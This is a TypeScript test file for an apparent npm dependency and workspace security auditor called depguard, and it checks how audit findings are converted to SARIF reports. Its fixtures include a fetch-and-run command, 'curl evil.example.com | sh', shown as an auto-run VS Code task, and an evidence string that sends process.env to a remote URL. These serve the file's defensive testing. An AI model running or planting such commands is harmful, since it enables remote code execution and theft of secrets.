import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import {
  auditToSarif,
  auditProjectToSarif,
  workspaceToSarif,
} from '../src/sarif.js'
import { DEPGUARD_VERSION } from '../src/version.js'
import type { AuditReport, NpmAdvisory, SecurityFinding } from '../src/types.js'
import type { BulkAuditReport, TransitiveVulnerability } from '../src/bulk.js'
import type { WorkspaceAuditResult, AutoExecFinding } from '../src/workspace-audit.js'

// --- fixtures ---------------------------------------------------------------

function adv(over: Partial<NpmAdvisory> = {}): NpmAdvisory {
  return {
    id: 1234,
    title: 'Prototype Pollution in lodash',
    severity: 'high',
    url: 'https://github.com/advisories/GHSA-jf85-cpcp-j695',
    vulnerable_versions: '<4.17.12',
    patched_versions: '>=4.17.12',
    cvss: { score: 7.4, vectorString: 'CVSS:3.1/AV:N' },
    ...over,
  }
}

function pkgReport(over: Partial<AuditReport> = {}): AuditReport {
  return {
    name: 'lodash',
    version: '4.17.11',
    license: 'MIT',
    description: 'desc',
    lastPublish: '2020-01-01',
    weeklyDownloads: 1000,
    versionCount: 100,
    dependencyCount: 0,
    hasInstallScripts: false,
    deprecated: false,
    vulnerabilities: { total: 1, critical: 0, high: 1, moderate: 0, low: 0, advisories: [adv()] },
    scriptAnalysis: { suspicious: false, risks: [] },
    fixSuggestions: [],
    licenseCompatibility: { compatible: true, license: 'MIT', targetLicense: 'MIT', reason: '' },
    warnings: [],
    ...over,
  }
}

function transitive(over: Partial<TransitiveVulnerability> = {}): TransitiveVulnerability {
  return {
    name: 'minimist',
    version: '1.2.0',
    advisories: [adv({ id: 999, title: 'Prototype Pollution in minimist', severity: 'moderate' })],
    pulledInBy: ['mocha'],
    ...over,
  }
}

function workspaceFinding(over: Partial<AutoExecFinding> = {}): AutoExecFinding {
  return {
    source: 'vscode-tasks',
    file: '/repo/.vscode/tasks.json',
    trigger: 'folderOpen',
    command: 'curl evil.example.com | sh',
    severity: 'HIGH',
    reasons: ['Pipes downloaded content directly into a shell'],
    ...over,
  }
}

// --- envelope tests ---------------------------------------------------------

describe('SARIF envelope', () => {
  it('emits version 2.1.0 with the OASIS schema', () => {
    const log = auditToSarif(pkgReport())
    assert.equal(log.version, '2.1.0')
    assert.ok(log.$schema.includes('sarif-schema-2.1.0'))
  })

  it('embeds depguard tool driver with current version', () => {
    const log = auditToSarif(pkgReport())
    const driver = log.runs[0].tool.driver
    assert.equal(driver.name, 'depguard')
    assert.equal(driver.version, DEPGUARD_VERSION)
    assert.equal(driver.semanticVersion, DEPGUARD_VERSION)
    assert.ok(driver.informationUri.startsWith('https://'))
  })

  it('produces exactly one run', () => {
    const log = auditToSarif(pkgReport())
    assert.equal(log.runs.length, 1)
  })

  it('produces valid empty SARIF for a clean report', () => {
    const clean = pkgReport({ vulnerabilities: { total: 0, critical: 0, high: 0, moderate: 0, low: 0, advisories: [] } })
    const log = auditToSarif(clean)
    assert.equal(log.runs[0].results.length, 0)
    assert.equal(log.runs[0].tool.driver.rules.length, 0)
    // structure still valid
    assert.equal(log.version, '2.1.0')
  })
})

// --- audit ------------------------------------------------------------------

describe('auditToSarif', () => {
  it('emits one result per advisory', () => {
    const log = auditToSarif(pkgReport({
      vulnerabilities: {
        total: 2, critical: 1, high: 1, moderate: 0, low: 0,
        advisories: [adv(), adv({ id: 2, title: 'RCE', severity: 'critical', url: 'https://github.com/advisories/GHSA-aaaa-bbbb-cccc' })],
      },
    }))
    assert.equal(log.runs[0].results.length, 2)
  })

  it('maps severity to SARIF level conservatively', () => {
    const log = auditToSarif(pkgReport({
      vulnerabilities: {
        total: 4, critical: 1, high: 1, moderate: 1, low: 1,
        advisories: [
          adv({ severity: 'critical', url: 'https://github.com/advisories/GHSA-1' }),
          adv({ severity: 'high', url: 'https://github.com/advisories/GHSA-2' }),
          adv({ severity: 'moderate', url: 'https://github.com/advisories/GHSA-3' }),
          adv({ severity: 'low', url: 'https://github.com/advisories/GHSA-4' }),
        ],
      },
    }))
    const levels = log.runs[0].results.map(r => r.level)
    assert.deepEqual(levels, ['error', 'error', 'warning', 'note'])
  })

  it('uses GHSA id in ruleId when available', () => {
    const log = auditToSarif(pkgReport({
      vulnerabilities: {
        total: 1, critical: 0, high: 1, moderate: 0, low: 0,
        advisories: [adv({ url: 'https://github.com/advisories/GHSA-jf85-cpcp-j695' })],
      },
    }))
    assert.equal(log.runs[0].results[0].ruleId, 'depguard/vuln/GHSA-JF85-CPCP-J695')
  })

  it('falls back to npm-<id> ruleId when no GHSA in url', () => {
    const log = auditToSarif(pkgReport({
      vulnerabilities: {
        total: 1, critical: 0, high: 1, moderate: 0, low: 0,
        advisories: [adv({ id: 7777, url: 'https://npmjs.com/advisories/7777' })],
      },
    }))
    assert.equal(log.runs[0].results[0].ruleId, 'depguard/vuln/npm-7777')
  })

  it('dedupes rules when multiple results reference the same advisory', () => {
    // Same advisory appearing twice in the list (would happen for dup data,
    // or in audit-project across packages — sanity check at the unit level).
    const a = adv({ url: 'https://github.com/advisories/GHSA-dup' })
    const log = auditToSarif(pkgReport({
      vulnerabilities: { total: 2, critical: 0, high: 2, moderate: 0, low: 0, advisories: [a, a] },
    }))
    assert.equal(log.runs[0].results.length, 2)
    assert.equal(log.runs[0].tool.driver.rules.length, 1)
  })

  it('attaches CVSS as security-severity property when available', () => {
    const log = auditToSarif(pkgReport({
      vulnerabilities: {
        total: 1, critical: 1, high: 0, moderate: 0, low: 0,
        advisories: [adv({ severity: 'critical', cvss: { score: 9.8, vectorString: 'AV:N' } })],
      },
    }))
    const rule = log.runs[0].tool.driver.rules[0]
    assert.equal(rule.properties['security-severity'], '9.8')
  })

  it('emits a logical location for the single package', () => {
    const log = auditToSarif(pkgReport({ name: '@types/node', version: '20.0.0' }))
    const loc = log.runs[0].results[0].locations[0]
    assert.ok(loc.logicalLocations)
    assert.equal(loc.logicalLocations?.[0].fullyQualifiedName, 'pkg:npm/@types/node@20.0.0')
  })

  it('emits a result per code-analysis finding', () => {
    const f: SecurityFinding = {
      severity: 'high',
      category: 'data-exfiltration',
      title: 'Sends env vars to remote',
      explanation: 'sends process.env to remote',
      evidence: 'fetch(URL, { body: process.env })',
      file: 'index.js',
      recommendation: 'do not install',
    }
    const log = auditToSarif(pkgReport({
      codeAnalysis: { hasFinding: true, findings: [f], filesAnalyzed: 1, skipped: false },
    }))
    assert.equal(log.runs[0].results.length, 2) // 1 vuln + 1 code finding
    const codeResult = log.runs[0].results.find(r => r.ruleId.startsWith('depguard/code/'))
    assert.ok(codeResult)
    assert.equal(codeResult.ruleId, 'depguard/code/data-exfiltration')
    assert.equal(codeResult.level, 'error')
  })

  it('produces stable partialFingerprints across two calls with the same input', () => {
    const r = pkgReport()
    const a = auditToSarif(r)
    const b = auditToSarif(r)
    assert.equal(
      a.runs[0].results[0].partialFingerprints.primaryLocationLineHash,
      b.runs[0].results[0].partialFingerprints.primaryLocationLineHash,
    )
  })
})

// --- audit-project ----------------------------------------------------------

describe('auditProjectToSarif', () => {
  function bulkReport(over: Partial<BulkAuditReport> = {}): BulkAuditReport {
    return {
      total: 1, clean: 0, vulnerable: 1, deprecated: 0,
      results: [pkgReport()],
      summary: { critical: 0, high: 1, moderate: 0, low: 0 },
      ...over,
    }
  }

  it('emits direct-dep advisories at the package.json location', () => {
    const log = auditProjectToSarif(bulkReport(), './package.json')
    assert.equal(log.runs[0].results.length, 1)
    const loc = log.runs[0].results[0].locations[0]
    assert.equal(loc.physicalLocation?.artifactLocation.uri, './package.json')
  })

  it('emits transitive advisories with parent attribution in message', () => {
    const log = auditProjectToSarif(bulkReport({
      transitiveSummary: {
        totalDeps: 10, vulnerable: 1, critical: 0, high: 0, moderate: 1, low: 0,
        details: [transitive({ pulledInBy: ['mocha', 'jest'] })],
      },
    }), './package.json')
    // 1 direct + 1 transitive
    assert.equal(log.runs[0].results.length, 2)
    const transitiveResult = log.runs[0].results.find(r => r.message.text.includes('transitive'))
    assert.ok(transitiveResult)
    assert.ok(transitiveResult.message.text.includes('pulled in by mocha, jest'))
  })

  it('emits packageManager advisories when present', () => {
    const log = auditProjectToSarif(bulkReport({
      packageManagerAudit: pkgReport({
        name: 'yarn',
        version: '1.0.0',
        vulnerabilities: { total: 1, critical: 0, high: 1, moderate: 0, low: 0, advisories: [adv({ url: 'https://github.com/advisories/GHSA-yarn', title: 'yarn vuln' })] },
      }),
    }), './package.json')
    // 1 direct + 1 packageManager
    assert.equal(log.runs[0].results.length, 2)
    const pmResult = log.runs[0].results.find(r => r.message.text.includes('packageManager'))
    assert.ok(pmResult)
  })

  it('strips absolute paths to workspace-relative form', () => {
    const abs = `${process.cwd()}/package.json`
    const log = auditProjectToSarif(bulkReport(), abs)
    const uri = log.runs[0].results[0].locations[0].physicalLocation?.artifactLocation.uri
    assert.equal(uri, 'package.json')
  })
})

// --- workspace --------------------------------------------------------------

describe('workspaceToSarif', () => {
  function wsReport(findings: AutoExecFinding[] = []): WorkspaceAuditResult {
    return {
      scannedPath: '/repo',
      findings,
      surfacesChecked: findings.map(f => f.source),
      summary: {
        info: findings.filter(f => f.severity === 'INFO').length,
        warn: findings.filter(f => f.severity === 'WARN').length,
        high: findings.filter(f => f.severity === 'HIGH').length,
      },
      note: 'test note',
    }
  }

  it('maps HIGH/WARN/INFO to error/warning/note', () => {
    const log = workspaceToSarif(wsReport([
      workspaceFinding({ severity: 'HIGH' }),
      workspaceFinding({ severity: 'WARN', source: 'envrc', file: '/repo/.envrc' }),
      workspaceFinding({ severity: 'INFO', source: 'makefile', file: '/repo/Makefile' }),
    ]))
    const levels = log.runs[0].results.map(r => r.level)
    assert.deepEqual(levels, ['error', 'warning', 'note'])
  })

  it('emits repo-relative artifact paths', () => {
    const log = workspaceToSarif(wsReport([workspaceFinding({ file: '/repo/.vscode/tasks.json' })]))
    const uri = log.runs[0].results[0].locations[0].physicalLocation?.artifactLocation.uri
    assert.equal(uri, '.vscode/tasks.json')
  })

  it('one rule per source category, deduped', () => {
    const log = workspaceToSarif(wsReport([
      workspaceFinding({ source: 'vscode-tasks', file: '/repo/.vscode/tasks.json' }),
      workspaceFinding({ source: 'vscode-tasks', file: '/repo/.vscode/tasks.json' }),
      workspaceFinding({ source: 'envrc', file: '/repo/.envrc' }),
    ]))
    const ids = log.runs[0].tool.driver.rules.map(r => r.id).sort()
    assert.deepEqual(ids, ['depguard/workspace/envrc', 'depguard/workspace/vscode-tasks'])
  })

  it('produces a stable fingerprint for the same finding', () => {
    const f = workspaceFinding()
    const a = workspaceToSarif(wsReport([f]))
    const b = workspaceToSarif(wsReport([f]))
    assert.equal(
      a.runs[0].results[0].partialFingerprints.primaryLocationLineHash,
      b.runs[0].results[0].partialFingerprints.primaryLocationLineHash,
    )
  })

  it('handles empty workspace result (no findings, valid envelope)', () => {
    const log = workspaceToSarif(wsReport([]))
    assert.equal(log.runs[0].results.length, 0)
    assert.equal(log.runs[0].tool.driver.rules.length, 0)
    assert.equal(log.version, '2.1.0')
  })
})

// --- required SARIF v2.1.0 fields (schema-shape sanity check) --------------

describe('SARIF v2.1.0 required-field shape', () => {
  it('every result has ruleId, level, message.text, and at least one location', () => {
    const log = auditProjectToSarif({
      total: 2, clean: 0, vulnerable: 2, deprecated: 0,
      results: [pkgReport(), pkgReport({ name: 'minimist', version: '1.2.0' })],
      summary: { critical: 0, high: 2, moderate: 0, low: 0 },
    }, './package.json')
    for (const r of log.runs[0].results) {
      assert.ok(r.ruleId)
      assert.ok(['error', 'warning', 'note', 'none'].includes(r.level))
      assert.ok(r.message?.text)
      assert.ok(r.locations && r.locations.length >= 1)
    }
  })

  it('every rule has id, shortDescription.text, defaultConfiguration.level', () => {
    const log = auditToSarif(pkgReport())
    for (const rule of log.runs[0].tool.driver.rules) {
      assert.ok(rule.id)
      assert.ok(rule.shortDescription?.text)
      assert.ok(['error', 'warning', 'note', 'none'].includes(rule.defaultConfiguration.level))
    }
  })
})
